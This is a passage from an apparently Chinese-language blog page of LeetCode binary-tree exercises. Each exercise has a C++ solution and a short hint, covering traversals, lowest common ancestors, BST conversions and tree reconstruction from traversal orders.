class="title">sumOfLeftLeaves</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> (root-&gt;left != <span class="literal">nullptr</span> &amp;&amp; root-&gt;left-&gt;left == <span class="literal">nullptr</span> &amp;&amp; root-&gt;left-&gt;right == <span class="literal">nullptr</span> ? root-&gt;left-&gt;val : <span class="number">0</span>) </span><br><span class="line">             + <span class="built_in">sumOfLeftLeaves</span>(root-&gt;left) + <span class="built_in">sumOfLeftLeaves</span>(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：重点是要加上所有的左叶子节点，每次遍历到一个点之后判断其左节点是不是叶子节点即可。</p></li><li><p>题目五：<a href="https://leetcode.cn/problems/find-bottom-left-tree-value">找树左下角的值</a><br>给定一个二叉树的根节点root，请找出该二叉树的最底层最左边节点的值。<br><img src="https://assets.leetcode.com/uploads/2020/12/14/tree2.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findBottomLeftValue</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode *&gt; nodes;</span><br><span class="line">        nodes.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="type">int</span> firstOfEachLayer = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (!nodes.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> size = nodes.<span class="built_in">size</span>();</span><br><span class="line">            firstOfEachLayer = nodes.<span class="built_in">front</span>()-&gt;val;</span><br><span class="line">            <span class="keyword">while</span> (size--) &#123;</span><br><span class="line">                TreeNode *temp = nodes.<span class="built_in">front</span>();</span><br><span class="line">                nodes.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (temp-&gt;left != <span class="literal">nullptr</span>)</span><br><span class="line">                    nodes.<span class="built_in">push</span>(temp-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (temp-&gt;right != <span class="literal">nullptr</span>)</span><br><span class="line">                    nodes.<span class="built_in">push</span>(temp-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> firstOfEachLayer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：简单的广搜即可，不知道为什么是中等题，使用递归的话比较麻烦，时间复杂度也偏高。</p></li><li><p>题目六：<a href="https://leetcode.cn/problems/convert-bst-to-greater-tree">把二叉搜索树转换为累加树</a><br>给出二叉搜索树的根节点，该树的节点值各不相同，请你将其转换为累加树(Greater Sum Tree)，使每个节点node的新值等于原树中大于或等于node.val的值之和。<br><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/05/03/tree.png" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">transferToBST</span><span class="params">(TreeNode* &amp;root, <span class="type">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> num;</span><br><span class="line">        root-&gt;val += <span class="built_in">transferToBST</span>(root-&gt;right, num);</span><br><span class="line">        <span class="type">int</span> rightTreeSum =  (root-&gt;left != <span class="literal">nullptr</span> ? <span class="built_in">transferToBST</span>(root-&gt;left, root-&gt;val) : root-&gt;val);</span><br><span class="line">        <span class="keyword">return</span> rightTreeSum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">convertBST</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">transferToBST</span>(root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：重点在于左节点如何获取到右节点的累加值，不能简单地直接往右节点递归，因为左节点的右子节点也要继承左节点的父结点的值。</p></li><li><p>题目七：<a href="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-search-tree">二叉搜索树的最近公共祖先</a><br>给定一个二叉搜索树, 找到该树中两个指定节点的最近公共祖先，一个节点也可以是它自己的祖先。<br><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/14/binarysearchtree_improved.png" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">findAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &gt; q-&gt;val)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">findAncestor</span>(root-&gt;left, p, q);</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &lt; p-&gt;val)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">findAncestor</span>(root-&gt;right, p, q);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;val &gt; q-&gt;val) &#123;</span><br><span class="line">            TreeNode* tmp = p;</span><br><span class="line">            p = q;</span><br><span class="line">            q = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">findAncestor</span>(root, p, q);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：没啥难的，利用搜索树的性质，两个都小于当前节点那么必然都在当前节点的左边，反之则在右边。</p></li><li><p>题目八：<a href="https://leetcode.cn/problems/minimum-absolute-difference-in-bst">二叉搜索树的最小绝对差</a><br>给你一个二叉搜索树的根节点root，返回树中任意两不同节点值之间的最小的差值绝对值。<br><img src="https://assets.leetcode.com/uploads/2021/02/05/bst1.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">inorder</span><span class="params">(TreeNode* node, <span class="type">int</span>&amp; prevVal, <span class="type">bool</span>&amp; hasPrev, <span class="type">int</span>&amp; minNum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!node) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">inorder</span>(node-&gt;left, prevVal, hasPrev, minNum);</span><br><span class="line">        <span class="keyword">if</span> (hasPrev) minNum = <span class="built_in">min</span>(minNum, node-&gt;val - prevVal);</span><br><span class="line">        <span class="keyword">else</span> hasPrev = <span class="literal">true</span>;</span><br><span class="line">        prevVal = node-&gt;val;</span><br><span class="line">        <span class="built_in">inorder</span>(node-&gt;right, prevVal, hasPrev, minNum);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getMinimumDifference</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> minNum = <span class="number">100001</span>;</span><br><span class="line">        <span class="type">int</span> prevVal = <span class="number">0</span>;</span><br><span class="line">        <span class="type">bool</span> hasPrev = <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">inorder</span>(root, prevVal, hasPrev, minNum);</span><br><span class="line">        <span class="keyword">return</span> minNum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：同样利用中序遍历来完成，这种遍历方法可以记一下，同样需要利用中序遍历的有<a href="https://leetcode.cn/problems/recover-binary-search-tree">恢复二叉搜索树</a>。</p></li><li><p>题目九：<a href="https://leetcode.cn/problems/number-of-good-leaf-nodes-pairs">好叶子节点对的数量</a><br>如果二叉树中两个叶节点之间的最短路径长度小于或者等于distance，那它们就可以构成一组好叶子节点对。返回树中好叶子节点对的数量。<br><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/07/26/e1.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">calculate</span><span class="params">(TreeNode* root, <span class="type">const</span> <span class="type">int</span>&amp; distance, <span class="type">int</span>&amp; count)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left == <span class="literal">nullptr</span> &amp;&amp; root-&gt;right == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">auto</span> leftDistances = <span class="built_in">calculate</span>(root-&gt;left, distance, count);</span><br><span class="line">        <span class="keyword">auto</span> rightDistances = <span class="built_in">calculate</span>(root-&gt;right, distance, count);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> leftDistance : leftDistances) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> rightDistance : rightDistances) &#123;</span><br><span class="line">                <span class="keyword">if</span> (leftDistance + rightDistance &lt;= distance)</span><br><span class="line">                    ++count;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> d : leftDistances) </span><br><span class="line">            <span class="keyword">if</span> (d + <span class="number">1</span> &lt;= distance) res.<span class="built_in">push_back</span>(d + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> d : rightDistances) </span><br><span class="line">            <span class="keyword">if</span> (d + <span class="number">1</span> &lt;= distance) res.<span class="built_in">push_back</span>(d + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countPairs</span><span class="params">(TreeNode* root, <span class="type">int</span> distance)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">calculate</span>(root, distance, count);</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：因为要记录所有叶结点的距离，所以需要返回<code>vector&lt;int&gt;</code>，其余部分和<a href="https://leetcode.cn/problems/diameter-of-binary-tree">二叉树的直径</a>类似。</p></li><li><p>题目十：<a href="https://leetcode.cn/problems/construct-binary-tree-from-preorder-and-postorder-traversal">根据前序和后序遍历构造二叉树</a><br>给定一个二叉树的前序遍历和后序遍历结果，尝试复原这个树(答案不唯一)。已知树里不存在重复值的节点。<br><img src="https://assets.leetcode.com/uploads/2021/07/24/lc-prepost.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">createTree</span><span class="params">(<span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; preorder, <span class="type">const</span> unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&amp; postMap, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span>&amp; preIdx)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (r - l &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (r - l &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">TreeNode</span>(preorder[preIdx++]);</span><br><span class="line">        &#125;</span><br><span class="line">        TreeNode *root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(preorder[preIdx++]);</span><br><span class="line">        <span class="type">int</span> mid = postMap.<span class="built_in">at</span>(preorder[preIdx]);</span><br><span class="line">        root-&gt;left = <span class="built_in">createTree</span>(preorder, postMap, l, mid, preIdx);</span><br><span class="line">        root-&gt;right = <span class="built_in">createTree</span>(preorder, postMap, mid + <span class="number">1</span>, r - <span class="number">1</span>, preIdx);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">constructFromPrePost</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; preorder, vector&lt;<span class="type">int</span>&gt;&amp; postorder)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> size = preorder.<span class="built_in">size</span>(), preIdx = <span class="number">0</span>;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; postMap;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">            postMap[postorder[i]] = i;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">createTree</span>(preorder, postMap, <span class="number">0</span>, size - <span class="number">1</span>, preIdx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：因为后序遍历无法通过当前根节点划分左右子树，所以需要去通过当前节点的子节点来划分，这样做的话为了避免越界需要让递归提前结束。</p></li><li><p>题目十一：<a href="https://leetcode.cn/problems/construct-binary-tree-from-inorder-and-postorder-traversal">从中序与后序遍历序列构造二叉树</a><br>给定一个二叉树的后序遍历和后序遍历结果，尝试复原这个树。已知树里不存在重复值的节点。<br><img src="https://assets.leetcode.com/uploads/2021/02/19/tree.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">createTree</span><span class="params">(<span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; postorder, <span class="type">const</span> unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&amp; inMap, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span>&amp; postIdx)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &gt; r) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="type">int</span> rootVal = postorder[postIdx--];</span><br><span class="line">        TreeNode *root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(rootVal);</span><br><span class="line">        <span class="type">int</span> mid = inMap.<span class="built_in">at</span>(rootVal);</span><br><span class="line">        root-&gt;right = <span class="built_in">createTree</span>(postorder, inMap, mid + <span class="number">1</span>, r, postIdx);</span><br><span class="line">        root-&gt;left = <span class="built_in">createTree</span>(postorder, inMap, l, mid - <span class="number">1</span>, postIdx);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTree</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; inorder, vector&lt;<span class="type">int</span>&gt;&amp; postorder)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> size = postorder.<span class="built_in">size</span>(), postIdx = size - <span class="number">1</span>;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; inMap;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; ++i) </span><br><span class="line">            inMap[inorder[i]] = i;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">createTree</span>(postorder, inMap, <span class="number">0</span>, size - <span class="number">1</span>, postIdx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：与<a href="https://leetcode.cn/problems/construct-binary-tree-from-preorder-and-inorder-traversal">从前序与中序遍历序列构造二叉树</a>的遍历方向相反即可。</p></li><li><p>题目十二：<a href="https://leetcode.cn/problems/binary-tree-inorder-traversal">二叉树的中序遍历</a><br>实现二叉树的中序遍历。<br><img src="https://assets.leetcode.com/uploads/2024/08/29/screenshot-2024-08-29-202743.png" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        stack&lt;TreeNode *&gt; stack;</span><br><span class="line">        stack.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (!stack.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            TreeNode *node = stack.<span class="built_in">top</span>();</span><br><span class="line">            <span class="keyword">if</span> (node-&gt;left != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                stack.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                node-&gt;left = <span class="literal">nullptr</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            stack.<span class="built_in">pop</span>();</span><br><span class="line">            res.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">            <span class="keyword">if</span> (node-&gt;right != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                stack.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">                node-&gt;right = <span class="literal">nullptr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：这是非递归的写法，使用了栈，递归写法非常简单不展示了。</p></li><li><p>题目十三：<a href="https://leetcode.cn/problems/binary-tree-postorder-traversal">二叉树的后序遍历</a><br>实现二叉树的后序遍历。<br><img src="https://assets.leetcode.com/uploads/2024/08/29/screenshot-2024-08-29-202743.png" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="comment">// private:</span></span><br><span class="line"><span class="comment">//     void postorderTraversalByRecursion(TreeNode* root, vector&lt;int&gt;&amp; res) &#123;</span></span><br><span class="line"><span class="comment">//         if (root == nullptr) return;</span></span><br><span class="line"><span class="comment">//         postorderTraversalByRecursion(root-&gt;left, res);</span></span><br><span class="line"><span class="comment">//         postorderTraversalByRecursion(root-&gt;right, res);</span></span><br><span class="line"><span class="comment">//         res.push_back(root-&gt;val);</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        stack&lt;TreeNode *&gt; stack;</span><br><span class="line">        stack.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (!stack.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            TreeNode *node = stack.<span class="built_in">top</span>();</span><br><span class="line">            <span class="keyword">if</span> (node-&gt;left != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                stack.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                node-&gt;left = <span class="literal">nullptr</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (node-&gt;right != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                stack.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">                node-&gt;right = <span class="literal">nullptr</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            stack.<span class="built_in">pop</span>();</span><br><span class="line">            res.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：两种写法都展示出来了。</p></li><li><p>题目十四：<a href="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-tree">二叉树的最近公共祖先</a><br>给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。<br><img src="https://assets.leetcode.com/uploads/2018/12/14/binarytree.png" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode *<span class="title">lowestCommonAncestor</span><span class="params">(TreeNode *root, TreeNode *p, TreeNode *q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span> || root == p || root == q)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        TreeNode *left = <span class="built_in">lowestCommonAncestor</span>(root-&gt;left, p, q);</span><br><span class="line">        TreeNode *right = <span class="built_in">lowestCommonAncestor</span>(root-&gt;right, p, q);</span><br><span class="line">        <span class="keyword">if</span> (left == <span class="literal">nullptr</span>) <span class="keyword">return</span> right;</span><br><span class="line">        <span class="keyword">if</span> (right == <span class="literal">nullptr</span>) <span class="keyword">return</span> left;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：仍然是使用递归，相对于<a href="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-search-tree">二叉搜索树的最近公共祖先</a>这道题的判断不再是节点的大小关系而是是否都在左边或者是右边(通过nullptr来判断)，如果不都在同一边则当前节点为祖先。</p></li><li><p>题目十五：<a href="https://leetcode.cn/problems/two-sum-iv-input-is-a-bst">两数之和 IV - 输入二叉搜索树</a><br>给定一个二叉搜索树root和一个目标结果k，如果二叉搜索树中存在两个元素且它们的和等于给定的目标结果，则返回true。<br><img src="https://assets.leetcode.com/uploads/2020/09/21/sum_tree_1.jpg" alt="示意图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">inorderTraversal</span><span class="params">(TreeNode* root, vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span 